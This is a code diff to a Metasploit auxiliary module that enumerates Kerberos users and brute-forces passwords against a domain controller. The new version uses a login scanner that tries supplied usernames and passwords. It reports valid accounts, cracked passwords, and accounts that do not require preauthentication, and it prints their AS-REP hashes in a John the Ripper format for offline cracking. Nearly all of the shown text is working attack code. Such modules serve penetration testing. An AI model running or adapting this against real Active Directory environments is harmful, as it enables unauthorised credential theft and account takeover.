@@ -38,62 +38,78 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
 
-    deregister_options('BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD', 'PASS_FILE', 'USER_AS_PASS', 'USERPASS_FILE')
+    register_advanced_options(
+      [
+        OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 20])
+      ]
+    )
   end
 
   def run
     domain = datastore['DOMAIN'].upcase
     print_status("Using domain: #{domain} - #{peer}...")
 
-    cred_collection = build_credential_collection({ usernames_only: true })
-    pre_auth = [build_pa_pac_request]
+    cred_collection = build_credential_collection(
+      username: datastore['USERNAME'],
+      password: datastore['PASSWORD'],
+      realm:  domain,
+      nil_passwords: true
+    )
     scanner = ::Metasploit::Framework::LoginScanner::Kerberos.new(
       host: self.rhost,
       port: self.rport,
       server_name: "krbtgt/#{domain}",
-      realm: domain.to_s,
-      pa_data: pre_auth,
       cred_details: cred_collection,
-      datastore: datastore
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      connection_timeout: datastore['ConnectTimeout'],
+      framework: framework,
+      framework_module: self,
     )
 
     scanner.scan! do |result|
-      credential_data = result.to_h
+      user = result.credential.public
+      password = result.credential.private
+      peer = result.host
+      proof = result.proof
 
-      case credential_data[:status]
-      when :eof
-        print_error("#{self.rhost} - User: #{credential_data[:username]} - EOF Error #{credential_data[:proof]}. Aborting...")
-        # Abort
-        break
-      when :decode_error
-        print_error("#{self.rhost} - User: #{credential_data[:username]} - Decoding Error -  #{credential_data[:proof]}. Aborting...")
-        # Abort
-        break
-      when :wrong_realm
-        print_error("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof]}. Domain option may be incorrect. Aborting...")
-        # Abort
-        break
-      when :no_preauth
-        print_good("#{self.rhost} - User: #{credential_data[:username]} does not require preauthentication. Hash: #{credential_data[:hash]}")
-        report_cred(
-          user: credential_data[:username],
-          asrep: credential_data[:hash]
-        )
-        break if datastore['STOP_ON_SUCCESS']
-      when :present
-        print_good("#{self.rhost} - User: #{credential_data[:username]} is present")
-        report_cred(user: credential_data[:username])
-        break if datastore['STOP_ON_SUCCESS']
-      when :disabled_or_locked_out
-        print_error("#{self.rhost} - User: #{credential_data[:username]} account disabled or locked out")
-      when :not_found
-        vprint_status("#{self.rhost} - User: #{credential_data[:username]} user not found")
-      when :unknown_error
-        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:error_code]}")
-      when :unknown_response
-        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof][:error_code]}. Unknown response #{credential_data[:proof][:repsonse]}")
-      else
-        print_error("#{self.rhost} - User: #{credential_data[:username]}. Unknown return status: #{credential_data[:status]}")
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        hash = format_as_rep_to_john_hash(proof.as_rep)
+
+        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a
+        # ticket present without requiring a password
+        if password.nil?
+          print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
+        else
+          print_good("#{peer} - User found: #{user.inspect} with password #{password}. Hash: #{hash}")
+        end
+
+        report_cred(user: user, password: password, asrep: hash)
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        print_error("#{peer} - User: #{user.inspect} - Unable to connect - #{proof}")
+
+      when Metasploit::Model::Login::Status::INCORRECT, Metasploit::Model::Login::Status::INCORRECT_PUBLIC_PART
+        if proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
+          print_error("#{peer} - User: #{user.inspect} - #{proof.error_code}. Domain option may be incorrect. Aborting...")
+          # Stop further requests entirely
+          break
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
+          print_good("#{peer} - User: #{user.inspect} is present")
+          report_cred(user: user)
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_FAILED
+          if password.nil?
+            print_good("#{peer} - User: #{user.inspect} is present")
+            report_cred(user: user)
+          else
+            vprint_status("#{peer} - User: #{user.inspect} wrong password #{password}")
+          end
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
+          print_error("#{peer} - User: #{user.inspect} account disabled or locked out")
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
+          vprint_status("#{peer} - User: #{user.inspect} user not found")
+        else
+          vprint_status("#{peer} - User: #{user.inspect} - #{proof.error_code}")
+        end
       end
     end
   end
@@ -117,7 +133,13 @@ class MetasploitModule < Msf::Auxiliary
       module_fullname: fullname
     }.merge(service_data)
 
-    if opts[:asrep]
+    # TODO: Confirm if we should store both passwords and asrep accounts as two separate logins or not
+    if opts[:password]
+      credential_data.merge!(
+        private_data: opts[:password],
+        private_type: :password
+      )
+    elsif opts[:asrep]
       credential_data.merge!(
         private_data: opts[:asrep],
         private_type: :nonreplayable_hash,
